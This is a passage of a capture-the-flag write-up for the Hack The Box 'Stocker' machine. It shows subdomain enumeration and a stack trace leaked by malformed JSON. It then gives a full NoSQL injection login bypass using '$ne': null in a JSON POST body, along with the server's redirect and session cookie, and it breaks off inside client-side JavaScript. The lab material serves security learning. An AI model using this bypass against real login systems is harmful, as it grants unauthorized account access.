<span class="o">[</span><span class="m">22</span>:31:07<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>js/
<span class="o">[</span><span class="m">22</span>:31:44<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>css/
<span class="o">[</span><span class="m">22</span>:32:20<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>fonts/
<span class="o">[</span><span class="m">22</span>:32:55<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>img/

Task<span class="w"> </span>Completed
</pre></div>
</div>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>whatweb<span class="w"> </span>http://stocker.htb
http://stocker.htb<span class="w"> </span><span class="o">[</span><span class="m">200</span><span class="w"> </span>OK<span class="o">]</span><span class="w"> </span>Bootstrap,<span class="w"> </span>Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>,<span class="w"> </span>HTML5,<span class="w"> </span>HTTPServer<span class="o">[</span>Ubuntu<span class="w"> </span>Linux<span class="o">][</span>nginx/1.18.0<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)]</span>,<span class="w"> </span>IP<span class="o">[</span><span class="m">10</span>.129.136.11<span class="o">]</span>,<span class="w"> </span>Meta-Author<span class="o">[</span>Holger<span class="w"> </span>Koenemann<span class="o">]</span>,<span class="w"> </span>MetaGenerator<span class="o">[</span>Eleventy<span class="w"> </span>v2.0.0<span class="o">]</span>,<span class="w"> </span>Script,<span class="w"> </span>Title<span class="o">[</span>Stock<span class="w"> </span>-<span class="w"> </span>Coming<span class="w"> </span>Soon!<span class="o">]</span>,<span class="w"> </span>nginx<span class="o">[</span><span class="m">1</span>.18.0<span class="o">]</span>
</pre></div>
</div>
<p><img alt="wappalizer.png" src="../../../../_images/wappalizer1.png" /></p>
<p>Manual enumaration of the site:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">AOS</span>            <span class="o">-</span> <span class="n">Animate</span> <span class="n">on</span> <span class="n">scroll</span> <span class="n">library</span>
<span class="n">Bootstrap</span> <span class="mi">5</span>    <span class="o">-</span> <span class="n">CSS</span> <span class="n">Framework</span>
<span class="n">Eleventy</span> <span class="mf">2.0.0</span> <span class="o">-</span> <span class="n">Static</span> <span class="n">site</span> <span class="n">generator</span>
<span class="n">Nginx</span> <span class="mf">1.18.0</span>   <span class="o">-</span> <span class="n">Webserver</span>
</pre></div>
</div>
<p>Potential users</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Angoose</span> <span class="n">Garden</span><span class="p">,</span> <span class="n">Head</span> <span class="n">of</span> <span class="n">IT</span> <span class="n">at</span> <span class="n">Stockers</span> <span class="n">Ltd</span><span class="o">.</span>
<span class="n">Meta</span><span class="o">-</span><span class="n">Author</span><span class="p">[</span><span class="n">Holger</span> <span class="n">Koenemann</span><span class="p">]</span>
</pre></div>
</div>
<p>Found the source of the template from templatedeck.com<br />
<a class="reference external" href="https://github.com/holger1411/Stride-HTML-Bootstrap-Template">Stride-HTML-Bootstrap-Template</a><br />
Holger is the author of the template, nothing to do with the app</p>
<p>So at this stage we pretty much have only a static site, and nothing interesting, so I tried to nmap all ports, and enumerating vhosts with bigger wordlists, wasted a bunch of time to finally realise by funneling gobuster’s traffic through burp that there’s a new option for vhosts now <code class="docutils literal notranslate"><span class="pre">--append-domain</span></code>, which is why gobuster was actually sending just the word from the wordlist without appending the rest of the domain… That’s kinda dumb, is that new? WTH… Looking at my notes for the awkward box, yes it used to append the domain by default on v3.1.0, and the version I’m using now is v3.4, talk about wasting my time… So this is the correct way now:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gobuster<span class="w"> </span>vhost<span class="w"> </span>--append-domain<span class="w"> </span>-u<span class="w"> </span>stocker.htb<span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
<span class="o">===============================================================</span>
Gobuster<span class="w"> </span>v3.4
by<span class="w"> </span>OJ<span class="w"> </span>Reeves<span class="w"> </span><span class="o">(</span>@TheColonial<span class="o">)</span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span>Christian<span class="w"> </span>Mehlmauer<span class="w"> </span><span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">             </span>http://stocker.htb
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">          </span>GET
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">         </span><span class="m">10</span>
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">        </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">      </span>gobuster/3.4
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">         </span>10s
<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Append<span class="w"> </span>Domain:<span class="w">   </span><span class="nb">true</span>
<span class="o">===============================================================</span>
<span class="m">2023</span>/01/28<span class="w"> </span><span class="m">12</span>:08:26<span class="w"> </span>Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>VHOST<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
<span class="o">===============================================================</span>
Found:<span class="w"> </span>dev.stocker.htb<span class="w"> </span>Status:<span class="w"> </span><span class="m">302</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">28</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>/login<span class="o">]</span>
Progress:<span class="w"> </span><span class="m">577</span><span class="w"> </span>/<span class="w"> </span><span class="m">4990</span><span class="w"> </span><span class="o">(</span><span class="m">11</span>.56%<span class="o">)</span>
</pre></div>
</div>
<p>Or the way I’ll probably do this from now on:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ffuf</span> \
  <span class="o">-</span><span class="n">c</span> \
  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span> \
  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://stocker.htb&quot;</span> \
  <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Host: FUZZ.stocker.htb&quot;</span> \
  <span class="o">-</span><span class="n">fc</span> <span class="mi">301</span>

        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>

       <span class="n">v1</span><span class="mf">.5.0</span> <span class="n">Kali</span> <span class="n">Exclusive</span> <span class="o">&lt;</span><span class="mi">3</span>
<span class="n">________________________________________________</span>

 <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
 <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
 <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">5000.</span><span class="n">txt</span>
 <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
 <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Calibration</span>    <span class="p">:</span> <span class="n">false</span>
 <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
 <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
 <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">405</span><span class="p">,</span><span class="mi">500</span>
 <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="mi">301</span>
<span class="n">________________________________________________</span>

<span class="n">dev</span>                     <span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">302</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">28</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">4</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">35</span><span class="n">ms</span><span class="p">]</span>
<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">4989</span><span class="o">/</span><span class="mi">4989</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1124</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">04</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
</pre></div>
</div>
<p>After adding that to our host file we can navigate to that vhost, and this is a login page.<br />
We know the backend for that is node, because we can see from te http headers that this is hosted on an Express server.<br />
So as pointed out by ippsec in his video about shoppy, just because it uses node, we can probably deduce that the db is mongo, or at least something nosql.
<img alt="node.png" src="../../../../_images/node.png" /></p>
</section>
<section id="nosql-login-bypass">
<h2>NoSQL login bypass<a class="headerlink" href="#nosql-login-bypass" title="Permalink to this heading">#</a></h2>
<p>Following the <a class="reference external" href="https://book.hacktricks.xyz/pentesting-web/nosql-injection">hacktricks page</a> on nosqli, and pretty much doing the exact same thing as ippsec showcased in his video, we can change the payload type to application/json and send invalid json on purpose. This returns a nodejs stack trace, which also leaks some path:</p>
<div class="highlight-html notranslate"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">pre</span><span class="p">&gt;</span>
SyntaxError: Unexpected token a in JSON at position 45<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at JSON.parse (<span class="ni">&amp;lt;</span>anonymous<span class="ni">&amp;gt;</span>)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at parse (/var/www/dev/node_modules/body-parser/lib/types/json.js:89:19)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at /var/www/dev/node_modules/body-parser/lib/read.js:128:18<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at AsyncResource.runInAsyncScope (node:async_hooks:203:9)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at invokeCallback (/var/www/dev/node_modules/raw-body/index.js:231:16)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at done (/var/www/dev/node_modules/raw-body/index.js:220:7)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at IncomingMessage.onEnd (/var/www/dev/node_modules/raw-body/index.js:280:7)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at IncomingMessage.emit (node:events:513:28)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at endReadableNT (node:internal/streams/readable:1359:12)<span class="p">&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
 <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at process.processTicksAndRejections (node:internal/process/task_queues:82:21)
<span class="p">&lt;/</span><span class="nt">pre</span><span class="p">&gt;</span>
</pre></div>
</div>
<p>We’re now attempting to do the not equal trick in json format.<br />
The string one doesn’t work and redirects to the login page again, but the null one:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">login</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
<span class="n">Accept</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xhtml</span><span class="o">+</span><span class="n">xml</span><span class="p">,</span><span class="n">application</span><span class="o">/</span><span class="n">xml</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.9</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">avif</span><span class="p">,</span><span class="n">image</span><span class="o">/</span><span class="n">webp</span><span class="p">,</span><span class="o">*/*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">55</span>
<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">login</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">connect</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">s</span><span class="o">%</span><span class="mi">3</span><span class="n">ABQLPJCRVtbFfVXj</span><span class="o">-</span><span class="mi">9</span><span class="n">O0BH2XcR4MhONsU</span><span class="o">.%</span><span class="mi">2</span><span class="n">B7h0w9</span><span class="o">%</span><span class="mi">2</span><span class="n">BrKhzpCdLJyODPSNcOoSKzxeMYPKNvmSZNOu0</span>
<span class="n">Upgrade</span><span class="o">-</span><span class="n">Insecure</span><span class="o">-</span><span class="n">Requests</span><span class="p">:</span> <span class="mi">1</span>

<span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;$ne&quot;</span><span class="p">:</span> <span class="n">null</span><span class="p">},</span> <span class="s2">&quot;password&quot;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&quot;$ne&quot;</span><span class="p">:</span> <span class="n">null</span><span class="p">}</span> <span class="p">}</span>
</pre></div>
</div>
<p>responds back whit a 302 as well but to the /stock page<br />
with a Set-Cookie header to a new express session id</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span> <span class="mi">302</span> <span class="n">Found</span>
<span class="n">Server</span><span class="p">:</span> <span class="n">nginx</span><span class="o">/</span><span class="mf">1.18.0</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">Date</span><span class="p">:</span> <span class="n">Sat</span><span class="p">,</span> <span class="mi">28</span> <span class="n">Jan</span> <span class="mi">2023</span> <span class="mi">14</span><span class="p">:</span><span class="mi">24</span><span class="p">:</span><span class="mi">10</span> <span class="n">GMT</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">;</span> <span class="n">charset</span><span class="o">=</span><span class="n">utf</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">56</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">X</span><span class="o">-</span><span class="n">Powered</span><span class="o">-</span><span class="n">By</span><span class="p">:</span> <span class="n">Express</span>
<span class="n">Location</span><span class="p">:</span> <span class="o">/</span><span class="n">stock</span>
<span class="n">Vary</span><span class="p">:</span> <span class="n">Accept</span>
<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">connect</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">s</span><span class="o">%</span><span class="mi">3</span><span class="n">AeuJjM4ivC0KICQA8NBmP0ofJkyzc4tof</span><span class="o">.</span><span class="n">StbQgcHx26HhA51CyGSgaHVlebcRQQ4Cz</span><span class="o">%</span><span class="mi">2</span><span class="n">FKzVX</span><span class="o">%</span><span class="mi">2</span><span class="n">FkPdc</span><span class="p">;</span> <span class="n">Path</span><span class="o">=/</span><span class="p">;</span> <span class="n">HttpOnly</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Found</span><span class="o">.</span> <span class="n">Redirecting</span> <span class="n">to</span> <span class="o">&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s2">&quot;/stock&quot;</span><span class="o">&gt;/</span><span class="n">stock</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Installing that cookie into our browser, we can now navigate to /stock</p>
</section>
<section id="enum-again">
<h2>Enum again<a class="headerlink" href="#enum-again" title="Permalink to this heading">#</a></h2>
<p>This is a simple webstore  with products that each have a add to cart button, and there’s a view cart, none of those buttons are doing http calls, so this is happening client side, but the products are added to cart, then the submit button does a POST</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">POST</span> <span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">order</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
<span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">Mozilla</span><span class="o">/</span><span class="mf">5.0</span> <span class="p">(</span><span class="n">X11</span><span class="p">;</span> <span class="n">Linux</span> <span class="n">aarch64</span><span class="p">;</span> <span class="n">rv</span><span class="p">:</span><span class="mf">102.0</span><span class="p">)</span> <span class="n">Gecko</span><span class="o">/</span><span class="mi">20100101</span> <span class="n">Firefox</span><span class="o">/</span><span class="mf">102.0</span>
<span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span> <span class="n">en</span><span class="o">-</span><span class="n">US</span><span class="p">,</span><span class="n">en</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.5</span>
<span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span> <span class="n">gzip</span><span class="p">,</span> <span class="n">deflate</span>
<span class="n">Referer</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">stock</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
<span class="n">Origin</span><span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">dev</span><span class="o">.</span><span class="n">stocker</span><span class="o">.</span><span class="n">htb</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span> <span class="mi">163</span>
<span class="n">Connection</span><span class="p">:</span> <span class="n">close</span>
<span class="n">Cookie</span><span class="p">:</span> <span class="n">connect</span><span class="o">.</span><span class="n">sid</span><span class="o">=</span><span class="n">s</span><span class="o">%</span><span class="mi">3</span><span class="n">AbbZi88s3VyXnFcdZLyVHmar9ts36h2pt</span><span class="o">.</span><span class="n">OxJN91F</span><span class="o">%</span><span class="mi">2</span><span class="n">B10qTaxqXNkAy</span><span class="o">%</span><span class="mi">2</span><span class="n">Bg</span><span class="o">%</span><span class="mi">2</span><span class="n">FiRnW</span><span class="o">%</span><span class="mi">2</span><span class="n">FI4FSW6qjEzzmdrE</span>

<span class="p">{</span>
  <span class="s2">&quot;basket&quot;</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="s2">&quot;_id&quot;</span><span class="p">:</span> <span class="s2">&quot;638f116eeb060210cbd83a8f&quot;</span><span class="p">,</span>
      <span class="s2">&quot;title&quot;</span><span class="p">:</span> <span class="s2">&quot;Bin&quot;</span><span class="p">,</span>
      <span class="s2">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;It&#39;s a rubbish bin.&quot;</span><span class="p">,</span>
      <span class="s2">&quot;image&quot;</span><span class="p">:</span> <span class="s2">&quot;bin.jpg&quot;</span><span class="p">,</span>
      <span class="s2">&quot;price&quot;</span><span class="p">:</span> <span class="mi">76</span><span class="p">,</span>
      <span class="s2">&quot;currentStock&quot;</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span>
      <span class="s2">&quot;__v&quot;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
      <span class="s2">&quot;amount&quot;</span><span class="p">:</span> <span class="mi">1</span>
    <span class="p">}</span>
  <span class="p">]</span>
<span class="p">}</span>
</pre></div>
</div>
<p>This is what the client side js looks like:</p>
<div class="highlight-js notranslate"><div class="highlight"><pre><span></span><span class="kd">const</span><span class="w"> </span><span class="nx">$</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="nx">selec</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">basket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="kd">let</span><span class="w"> </span><span class="nx">productStore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">cartModalElement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#cart-modal&quot;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">cartModal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">bootstrap</span><span class="p">.</span><span class="nx">Modal</span><span class="p">(</span><span class="nx">cartModalElement</span><span class="p">);</span>

<span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;/api/products&quot;</span><span class="p">)</span>
<span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="p">.</span><span class="nx">then</span><span class="p">((</span><span class="nx">products</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="nx">productStore</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">products</span><span class="p">;</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#product-template&quot;</span><span class="p">);</span>

<span class="nx">products</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">product</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">clone</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">template</span><span class="p">.</span><span class="nx">content</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">$$</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">selector</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">clone</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="nx">selector</span><span class="p">);</span>

<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-title&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">product</span><span class="p">.</span><span class="nx">title</span><span class="p">;</span>
<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-description&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">product</span><span class="p">.</span><span class="nx">description</span><span class="p">;</span>
<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-price&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`£</span><span class="si">${</span><span class="nx">product</span><span class="p">.</span><span class="nx">price</span><span class="p">.</span><span class="nx">toFixed</span><span class="p">(</span><span class="mf">2</span><span class="p">)</span><span class="si">}</span><span class="sb">`</span><span class="p">;</span>
<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-stock&quot;</span><span class="p">).</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">product</span><span class="p">.</span><span class="nx">currentStock</span><span class="si">}</span><span class="sb"> In Stock`</span><span class="p">;</span>
<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.item-image&quot;</span><span class="p">).</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;src&quot;</span><span class="p">,</span><span class="w"> </span><span class="sb">`/static/img/</span><span class="si">${</span><span class="nx">product</span><span class="p">.</span><span class="nx">image</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">  </span><span class="nx">$$</span><span class="p">(</span><span class="s2">&quot;.add-to-basket&quot;</span><span class="p">).</span><span class="nx">setAttribute</span><span class="p">(</span><span class="s2">&quot;product-id&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">product</span><span class="p">.</span><span class="nx">_id</span><span class="p">);</span>

<span class="w">  </span><span class="nx">$</span><span class="p">(</span><span class="s2">&quot;#item-container&quot;</span><span class="p">).</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">clone</span><span class="p">);</span>
<span class="p">});</span>

